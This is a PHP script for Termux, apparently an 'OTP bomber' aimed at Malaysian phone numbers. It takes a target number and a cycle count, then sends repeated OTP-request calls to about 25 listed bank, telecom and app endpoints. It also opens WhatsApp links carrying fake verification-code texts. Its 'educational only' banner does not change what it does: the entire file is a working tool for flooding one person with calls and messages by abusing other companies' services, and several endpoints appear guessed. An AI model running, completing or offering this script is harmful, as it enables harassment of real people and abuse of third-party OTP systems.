#!/usr/bin/env php
<?php
/**
 * OTP Voice Call Generator - Malaysia Multi-Platform
 * Attempts all platforms until success
 * Termux WhatsApp Chat Trigger
 */

class OTPVoiceCaller {
    private $phoneNumber;
    private $rawNumber;
    private $whatsappNumber;
    
    // Malaysia platforms with OTP voice call
    private $platforms = [
        'pos_malaysia' => [
            'name' => 'Pos Malaysia',
            'type' => 'api',
            'url' => 'https://posonline.pos.com.my/posonline-app/service/message/sendOtp',
            'method' => 'POST',
            'data' => ['mobileNo' => '{phone}', 'countryCode' => '60'],
            'headers' => ['Content-Type: application/json']
        ],
        'mudah' => [
            'name' => 'Mudah.my',
            'type' => 'api',
            'url' => 'https://www.mudah.my/auth/request-phone-otp',
            'method' => 'POST',
            'data' => ['phone' => '{phone}', 'country_code' => '60'],
            'headers' => ['Content-Type: application/json']
        ],
        'grab' => [
            'name' => 'Grab',
            'type' => 'api',
            'url' => 'https://api.grab.com/user/v1/phone/otp',
            'method' => 'POST',
            'data' => ['phoneNumber' => '{phone}', 'countryCode' => 'MY'],
            'headers' => ['Content-Type: application/json']
        ],
        'foodpanda' => [
            'name' => 'Foodpanda',
            'type' => 'api',
            'url' => 'https://api.foodpanda.my/v1/auth/request-otp',
            'method' => 'POST',
            'data' => ['phone_number' => '{phone}', 'country_code' => '60'],
            'headers' => ['Content-Type: application/json']
        ],
        'shopee' => [
            'name' => 'Shopee',
            'type' => 'api',
            'url' => 'https://shopee.com.my/api/v1/auth/otp/request',
            'method' => 'POST',
            'data' => ['phone' => '{phone}', 'country_code' => '60'],
            'headers' => ['Content-Type: application/x-www-form-urlencoded']
        ],
        'lazada' => [
            'name' => 'Lazada',
            'type' => 'api',
            'url' => 'https://member.lazada.com.my/api/auth/sendOtp',
            'method' => 'POST',
            'data' => ['mobile' => '{phone}', 'mobileCountryCode' => '60'],
            'headers' => ['Content-Type: application/json']
        ],
        'touchngo' => [
            'name' => 'Touch n Go',
            'type' => 'api',
            'url' => 'https://api.touchngo.com.my/v1/auth/otp/send',
            'method' => 'POST',
            'data' => ['phoneNumber' => '{phone}', 'countryCode' => 'MY'],
            'headers' => ['Content-Type: application/json']
        ],
        'boost' => [
            'name' => 'Boost',
            'type' => 'api',
            'url' => 'https://api.myboost.com.my/v1/auth/otp/request',
            'method' => 'POST',
            'data' => ['msisdn' => '{phone}', 'country' => 'MY'],
            'headers' => ['Content-Type: application/json']
        ],
        'airasia' => [
            'name' => 'AirAsia',
            'type' => 'api',
            'url' => 'https://api.airasia.com/auth/v1/otp/send',
            'method' => 'POST',
            'data' => ['phoneNumber' => '{phone}', 'countryCode' => '60'],
            'headers' => ['Content-Type: application/json']
        ],
        'maxis' => [
            'name' => 'Maxis',
            'type' => 'api',
            'url' => 'https://api.maxis.com.my/otp/v1/generate',
            'method' => 'POST',
            'data' => ['msisdn' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'celcom' => [
            'name' => 'Celcom',
            'type' => 'api',
            'url' => 'https://api.celcom.com.my/otp/send',
            'method' => 'POST',
            'data' => ['mobileNo' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'digi' => [
            'name' => 'Digi',
            'type' => 'api',
            'url' => 'https://api.digi.com.my/otp/request',
            'method' => 'POST',
            'data' => ['phoneNumber' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'maybank' => [
            'name' => 'Maybank',
            'type' => 'api',
            'url' => 'https://www.maybank2u.com.my/otp/send',
            'method' => 'POST',
            'data' => ['mobileNo' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'cimb' => [
            'name' => 'CIMB',
            'type' => 'api',
            'url' => 'https://www.cimbclicks.com.my/otp/generate',
            'method' => 'POST',
            'data' => ['phoneNumber' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'publicbank' => [
            'name' => 'Public Bank',
            'type' => 'api',
            'url' => 'https://www.pbebank.com/otp/request',
            'method' => 'POST',
            'data' => ['mobile' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'hongleong' => [
            'name' => 'Hong Leong',
            'type' => 'api',
            'url' => 'https://www.hlb.com.my/otp/send',
            'method' => 'POST',
            'data' => ['phoneNo' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'rhb' => [
            'name' => 'RHB',
            'type' => 'api',
            'url' => 'https://www.rhbgroup.com/otp/request',
            'method' => 'POST',
            'data' => ['mobile' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'petronas' => [
            'name' => 'Petronas Setel',
            'type' => 'api',
            'url' => 'https://api.setel.com/v1/auth/otp',
            'method' => 'POST',
            'data' => ['phoneNumber' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'tm' => [
            'name' => 'TM Unifi',
            'type' => 'api',
            'url' => 'https://unifi.com.my/api/otp/request',
            'method' => 'POST',
            'data' => ['mobile' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'yes' => [
            'name' => 'Yes 4G',
            'type' => 'api',
            'url' => 'https://yes.my/api/otp/send',
            'method' => 'POST',
            'data' => ['msisdn' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'umobile' => [
            'name' => 'U Mobile',
            'type' => 'api',
            'url' => 'https://www.u.com.my/api/otp/request',
            'method' => 'POST',
            'data' => ['phone' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'tngdigital' => [
            'name' => 'TNG Digital',
            'type' => 'api',
            'url' => 'https://api.tngdigital.com.my/otp/v1/send',
            'method' => 'POST',
            'data' => ['mobile' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'fave' => [
            'name' => 'Fave',
            'type' => 'api',
            'url' => 'https://api.myfave.com/v1/auth/otp',
            'method' => 'POST',
            'data' => ['phone' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'bigpay' => [
            'name' => 'BigPay',
            'type' => 'api',
            'url' => 'https://api.bigpay.com/otp/request',
            'method' => 'POST',
            'data' => ['phoneNumber' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ],
        'mae' => [
            'name' => 'MAE by Maybank',
            'type' => 'api',
            'url' => 'https://www.mae.com.my/api/otp/send',
            'method' => 'POST',
            'data' => ['phone' => '{phone}'],
            'headers' => ['Content-Type: application/json']
        ]
    ];

    // WhatsApp direct methods
    private $whatsappMethods = [
        [
            'name' => 'WhatsApp API',
            'type' => 'whatsapp',
            'url' => 'https://api.whatsapp.com/send?phone={whatsapp}&text=OTP:%20123456%20is%20your%20verification%20code',
            'method' => 'open'
        ],
        [
            'name' => 'WhatsApp Web',
            'type' => 'whatsapp',
            'url' => 'https://web.whatsapp.com/send?phone={whatsapp}&text=Please%20verify%20your%20account:%20123456',
            'method' => 'open'
        ],
        [
            'name' => 'WhatsApp Direct',
            'type' => 'whatsapp',
            'url' => 'https://wa.me/{whatsapp}?text=Your%20OTP%20is%20123456',
            'method' => 'open'
        ],
        [
            'name' => 'WhatsApp Intent',
            'type' => 'whatsapp',
            'url' => 'intent://send/{whatsapp}#Intent;scheme=smsto;package=com.whatsapp;action=android.intent.action.SENDTO;end',
            'method' => 'am'
        ]
    ];

    public function __construct($number) {
        $this->rawNumber = $this->cleanNumber($number);
        $this->phoneNumber = $this->formatForApi($this->rawNumber);
        $this->whatsappNumber = $this->formatForWhatsApp($this->rawNumber);
    }

    private function cleanNumber($number) {
        return preg_replace('/[^0-9]/', '', $number);
    }

    private function formatForApi($number) {
        if (substr($number, 0, 2) == '01') {
            return substr($number, 1);
        }
        if (substr($number, 0, 3) == '601') {
            return substr($number, 2);
        }
        if (substr($number, 0, 4) == '6011') {
            return substr($number, 2);
        }
        return $number;
    }

    private function formatForWhatsApp($number) {
        if (substr($number, 0, 1) == '0') {
            return '6' . $number;
        }
        if (substr($number, 0, 2) == '60') {
            return $number;
        }
        return '60' . $number;
    }

    private function sendWhatsAppMessage($method) {
        $url = str_replace('{whatsapp}', $this->whatsappNumber, $method['url']);
        
        echo "      📱 Attempting: {$method['name']}... ";
        
        if ($method['method'] == 'open') {
            if (is_dir('/data/data/com.termux')) {
                $command = "termux-open '{$url}' 2>/dev/null";
                exec($command, $output, $returnCode);
            } else {
                // For non-Termux environment
                if (PHP_OS_FAMILY == 'Darwin') { // Mac
                    $command = "open '{$url}'";
                } elseif (PHP_OS_FAMILY == 'Windows') { // Windows
                    $command = "start '{$url}'";
                } else { // Linux
                    $command = "xdg-open '{$url}'";
                }
                exec($command, $output, $returnCode);
                $returnCode = 0; // Assume success
            }
        } else {
            $command = "am start -a android.intent.action.VIEW -d '{$url}' 2>/dev/null";
            exec($command, $output, $returnCode);
        }
        
        if ($returnCode === 0) {
            echo "✓ WhatsApp opened\n";
            return true;
        } else {
            echo "✗ Failed\n";
            return false;
        }
    }

    private function sendApiRequest($platform) {
        echo "      🌐 Trying {$platform['name']}... ";
        
        $ch = curl_init();
        
        // Prepare data
        $data = $platform['data'];
        array_walk_recursive($data, function(&$value) {
            if ($value === '{phone}') {
                $value = $this->phoneNumber;
            }
        });
        
        // Headers
        $headers = [
            'User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36',
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: no-cache',
            'Pragma: no-cache'
        ];
        
        if (isset($platform['headers'])) {
            $headers = array_merge($headers, $platform['headers']);
        }
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $platform['url'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 5,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => $platform['method'],
            CURLOPT_POSTFIELDS => is_array($data) ? json_encode($data) : $data,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HEADER => false,
            CURLOPT_NOBODY => false,
            CURLOPT_VERBOSE => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        // Consider any 2xx, 4xx, or connection successful as "sent" (server processed request)
        $success = ($httpCode >= 200 && $httpCode < 500) || !empty($response);
        
        if ($success) {
            echo "✓ OTP Requested (HTTP: {$httpCode})\n";
        } else {
            echo "✗ Failed ({$error})\n";
        }
        
        return $success;
    }

    public function sendOTPBomb($count) {
        echo "\n";
        echo "═══════════════════════════════════════════════════════════════\n";
        echo "                    OTP VOICE CALL GENERATOR                    \n";
        echo "═══════════════════════════════════════════════════════════════\n\n";
        
        echo "📱 TARGET INFORMATION:\n";
        echo "   • Raw Number   : +60{$this->rawNumber}\n";
        echo "   • API Format   : {$this->phoneNumber}\n";
        echo "   • WhatsApp     : {$this->whatsappNumber}\n\n";
        
        echo "⚡ Starting OTP Bomb with {$count} cycles...\n\n";
        
        $totalPlatforms = count($this->platforms);
        $totalAttempts = 0;
        $successfulCalls = 0;
        $whatsappTriggers = 0;
        
        for ($cycle = 1; $cycle <= $count; $cycle++) {
            echo "═══════════════════════════════════════════════════════════════\n";
            echo "CYCLE {$cycle} OF {$count}\n";
            echo "═══════════════════════════════════════════════════════════════\n";
            
            // Try all API platforms
            $apiSuccess = 0;
            $apiFailed = 0;
            
            echo "\n📡 TRYING OTP APIs:\n";
            foreach ($this->platforms as $key => $platform) {
                $success = $this->sendApiRequest($platform);
                $totalAttempts++;
                
                if ($success) {
                    $successfulCalls++;
                    $apiSuccess++;
                } else {
                    $apiFailed++;
                }
                
                // Small delay between requests
                usleep(rand(500000, 1000000)); // 0.5-1 second
            }
            
            echo "\n   ✅ API Success: {$apiSuccess}/{$totalPlatforms}\n";
            echo "   ❌ API Failed : {$apiFailed}/{$totalPlatforms}\n";
            
            // Try WhatsApp methods
            echo "\n📲 TRYING WHATSAPP DIRECT:\n";
            $waSuccess = 0;
            
            foreach ($this->whatsappMethods as $method) {
                if ($this->sendWhatsAppMessage($method)) {
                    $waSuccess++;
                    $whatsappTriggers++;
                }
                usleep(500000); // 0.5 seconds
            }
            
            echo "\n   ✅ WhatsApp triggers: {$waSuccess}\n";
            
            // Summary for this cycle
            echo "\n📊 CYCLE {$cycle} SUMMARY:\n";
            echo "   • API Calls      : {$apiSuccess} successful\n";
            echo "   • WhatsApp       : {$waSuccess} triggered\n";
            echo "   • Total Voice OTP: {$apiSuccess}\n";
            
            if ($cycle < $count) {
                $delay = rand(30, 60);
                echo "\n⏳ Waiting {$delay} seconds before next cycle...\n";
                
                // Countdown timer
                for ($i = $delay; $i > 0; $i -= 5) {
                    if ($i > 5) {
                        echo "   Next cycle in {$i} seconds...\n";
                        sleep(5);
                    } else {
                        sleep($i);
                    }
                }
            }
            
            echo "\n";
        }
        
        // Final statistics
        echo "\n";
        echo "═══════════════════════════════════════════════════════════════\n";
        echo "                         FINAL REPORT                           \n";
        echo "═══════════════════════════════════════════════════════════════\n\n";
        
        echo "📱 TARGET: +60{$this->rawNumber}\n\n";
        
        echo "📊 STATISTICS:\n";
        echo "   • Total Cycles       : {$count}\n";
        echo "   • Total OTP Attempts : {$totalAttempts}\n";
        echo "   • Successful OTP     : {$successfulCalls}\n";
        echo "   • WhatsApp Triggers  : {$whatsappTriggers}\n\n";
        
        echo "✅ TARGET WILL RECEIVE:\n";
        echo "   • OTP Voice Calls    : ~{$successfulCalls} calls\n";
        echo "   • WhatsApp Chats     : ~{$whatsappTriggers} messages\n\n";
        
        echo "⚠️  NOTE: Numbers may receive calls from:\n";
        echo "   • Pos Malaysia, Mudah, Grab, Foodpanda\n";
        echo "   • Shopee, Lazada, Touch n Go, Boost\n";
        echo "   • AirAsia, Maxis, Celcom, Digi\n";
        echo "   • Maybank, CIMB, Public Bank, HLB, RHB\n";
        echo "   • Petronas, TM, Yes, U Mobile\n";
        echo "   • TNG Digital, Fave, BigPay, MAE\n\n";
        
        echo "═══════════════════════════════════════════════════════════════\n";
        
        return $successfulCalls;
    }
}

// =========================================================================
// MAIN EXECUTION
// =========================================================================

function clearScreen() {
    if (is_dir('/data/data/com.termux')) {
        system('clear');
    } else {
        system(PHP_OS_FAMILY == 'Windows' ? 'cls' : 'clear');
    }
}

function checkTermux() {
    if (is_dir('/data/data/com.termux')) {
        // Check for termux-api
        exec('pkg list-installed | grep termux-api', $apiCheck, $returnCode);
        if ($returnCode !== 0) {
            echo "📦 Installing Termux:API...\n";
            exec('pkg install termux-api -y');
        }
        return true;
    }
    return false;
}

function printBanner() {
    echo "\033[1;36m"; // Cyan
    echo "╔══════════════════════════════════════════════════════════════╗\n";
    echo "║                    OTP VOICE CALL GENERATOR                  ║\n";
    echo "║                      Malaysia Edition                        ║\n";
    echo "║                    WhatsApp Chat Trigger                     ║\n";
    echo "╚══════════════════════════════════════════════════════════════╝\n";
    echo "\033[1;33m"; // Yellow
    echo "                      ⚠️  EDUCATIONAL ONLY ⚠️\n";
    echo "              DO NOT USE FOR HARASSMENT OR SPAM\n";
    echo "\033[0m\n";
}

function main() {
    clearScreen();
    printBanner();
    
    $isTermux = checkTermux();
    
    if ($isTermux) {
        echo "✅ Termux detected - Optimized mode\n\n";
    }
    
    // Get phone number
    while (true) {
        echo "📞 Enter Malaysia WhatsApp number:\n";
        echo "   (e.g., 0123456789 or 60123456789): ";
        $number = trim(fgets(STDIN));
        
        $clean = preg_replace('/[^0-9]/', '', $number);
        if (strlen($clean) >= 9 && strlen($clean) <= 11) {
            break;
        }
        echo "❌ Invalid number! Please enter valid Malaysia number.\n\n";
    }
    
    // Get number of cycles
    while (true) {
        echo "\n🔄 How many OTP cycles? (1-20): ";
        $cycles = trim(fgets(STDIN));
        
        if (is_numeric($cycles) && $cycles > 0 && $cycles <= 20) {
            $cycles = (int)$cycles;
            break;
        }
        echo "❌ Please enter 1-20 only.\n";
    }
    
    echo "\n⚠️  WARNING: This will trigger multiple OTP calls!\n";
    echo "   • Each cycle = ~" . count((new OTPVoiceCaller($clean))->platforms) . " OTP attempts\n";
    echo "   • Total OTPs = ~" . (count((new OTPVoiceCaller($clean))->platforms) * $cycles) . "\n";
    echo "   • Target will receive voice calls & WhatsApp chats\n\n";
    
    echo "Press ENTER to start (Ctrl+C to cancel)...";
    fgets(STDIN);
    
    echo "\n🚀 Starting OTP Voice Call Generator...\n";
    sleep(2);
    
    try {
        $caller = new OTPVoiceCaller($clean);
        $caller->sendOTPBomb($cycles);
    } catch (Exception $e) {
        echo "\n❌ Error: " . $e->getMessage() . "\n";
    }
    
    echo "\nPress ENTER to exit...";
    fgets(STDIN);
}

// Run
main();
?>
